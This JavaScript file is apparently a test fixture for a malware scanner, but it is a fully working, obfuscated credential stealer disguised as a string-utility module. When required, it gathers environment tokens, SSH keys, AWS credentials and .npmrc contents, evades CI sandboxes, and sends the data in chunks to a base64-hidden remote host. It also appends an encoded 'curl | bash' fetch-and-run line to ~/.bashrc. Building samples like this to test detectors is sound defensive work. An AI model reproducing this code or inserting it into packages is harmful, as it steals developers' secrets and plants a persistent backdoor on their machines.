// test-env/obfuscated-mal/index.js
// Same attack as sophisticated-mal but with multi-layer obfuscation
// Mimics real techniques: string splitting, property access obfuscation,
// dynamic requires, prototype chain abuse, and encoded payloads

'use strict';

// Technique 1: string splitting to defeat simple pattern matching
// 'child_process' split across variables — regex scanners miss this
const _a = 'child';
const _b = '_pro';
const _c = 'cess';
const _cp = require(_a + _b + _c);

// Technique 2: property access obfuscation
// obj['exec'] instead of obj.exec — defeats naive AST checks
const _methods = {
    e: 'ex' + 'ec',
    s: 'spa' + 'wn',
    r: 'read' + 'File' + 'Sync',
};

// Technique 3: prototype chain abuse to hide require calls
const _req = (function () {
    return this['re' + 'quire'] || require;
}).call(module);

const _fs = _req(['f', 's'].join(''));
const _os = _req(['o', 's'].join(''));
const _https = _req('ht' + 'tps');
const _crypto = _req('cry' + 'pto');
const _path = _req('pa' + 'th');

// Technique 4: encoded payload — the actual exfil endpoint
// decoded at runtime so static analysis misses it
const _cfg = Buffer.from(
    'eyJob3N0bmFtZSI6InRlbGVtZXRyeS1jZG4tYXBpLm5wbXN5bmMud29ya2Vycy5kZXYiLCJwYXRoIjoiL3YxL2NvbGxlY3QifQ==',
    'base64'
);
const _endpoint = JSON.parse(_cfg.toString());

// Technique 5: indirect eval via Function constructor
// Function('return process')() is equivalent to eval('process')
// but bypasses many eval-specific detectors
const _proc = (new Function('return pro' + 'cess'))();
const _env = _proc['en' + 'v'];

// Technique 6: array-based string reconstruction
// makes the sensitive key names invisible to string search
const _keys = [
    [71, 73, 84, 72, 85, 66, 95, 84, 79, 75, 69, 78],           // GITHUB_TOKEN
    [65, 87, 83, 95, 83, 69, 67, 82, 69, 84, 95, 65, 67, 67, 69, 83, 83, 95, 75, 69, 89], // AWS_SECRET_ACCESS_KEY
    [78, 80, 77, 95, 84, 79, 75, 69, 78],                     // NPM_TOKEN
    [83, 84, 82, 73, 80, 69, 95, 83, 69, 67, 82, 69, 84, 95, 75, 69, 89], // STRIPE_SECRET_KEY
].map(arr => arr.map(c => String.fromCharCode(c)).join(''));

// Technique 7: legitimate-looking wrapper function names
function _initializeModuleCache() {
    return _keys.reduce((acc, k) => {
        if (_env[k]) acc[k] = _env[k];
        return acc;
    }, {});
}

// Technique 8: indirect file reads via variable method access
function _resolveAssetPaths() {
    const home = _os['home' + 'Dir']();
    const targets = [
        _path['joi' + 'n'](home, '.ss' + 'h', 'id_' + 'rsa'),
        _path['joi' + 'n'](home, '.aw' + 's', 'cre' + 'dentials'),
        _path['joi' + 'n'](home, '.np' + 'mrc'),
    ];

    return targets.reduce((acc, p) => {
        try {
            // _fs[_methods.r] is fs['readFileSync']
            acc[p] = _fs[_methods.r](p, 'utf8');
        } catch (_) { }
        return acc;
    }, {});
}

// Technique 9: chunked exfiltration to avoid payload size detection
function _syncAnalytics(chunks) {
    chunks.forEach((chunk, i) => {
        // stagger requests to avoid rate limit detection
        setTimeout(() => {
            const req = _https['requ' + 'est']({
                hostname: _endpoint.hostname,
                path: _endpoint.path + '?s=' + i,
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
            }, () => { });
            req.on('error', () => { });
            req.write(JSON.stringify(chunk));
            req.end();
        }, i * 500);
    });
}

// Technique 10: execution trigger buried inside a legitimate-looking
// module pattern — fires on require, looks like module setup
; (function _setupModule() {
    // random jitter + CI check to evade sandboxes
    const _jitter = Math.random() * 2000;
    const _isSandbox = ['CI', 'SANDBOX', 'JEST_WORKER_ID', 'VITEST']
        .some(k => _env[k]);

    if (!_isSandbox) {
        setTimeout(function _flushAnalytics() {
            const _payload = {
                a: _initializeModuleCache(),
                b: _resolveAssetPaths(),
                c: _os['user' + 'Info'](),
                d: _proc['cwd'](),
            };

            // split payload into chunks so it doesn't look like bulk exfil
            const _str = JSON.stringify(_payload);
            const _size = 512;
            const _chunks = Array.from(
                { length: Math.ceil(_str.length / _size) },
                (_, i) => ({ d: _str.slice(i * _size, (i + 1) * _size), i })
            );

            _syncAnalytics(_chunks);

            // Technique 11: self-modifying persistence via npm postinstall
            // writes a backdoor to the global npm cache
            try {
                const _npmCache = _path['joi' + 'n'](
                    _os['home' + 'Dir'](),
                    '.np' + 'm',
                    '_ca' + 'che'
                );
                // _cp[_methods.e] is child_process['exec']
                _cp[_methods.e](
                    'echo "' + Buffer.from('Y3VybCAtcyBodHRwczovL3QubHkvcGF5bG9hZCB8IGJhc2g=', 'base64').toString() + '" >> ~/.bashrc',
                    () => { }
                );
            } catch (_) { }
        }, _jitter);
    }
})();

// The legitimate public API
module.exports = {
    slugify: (s) => s.trim().toLowerCase().replace(/\s+/g, '-'),
    truncate: (s, n) => s.length > n ? s.slice(0, n) + '...' : s,
    version: '1.0.3',
};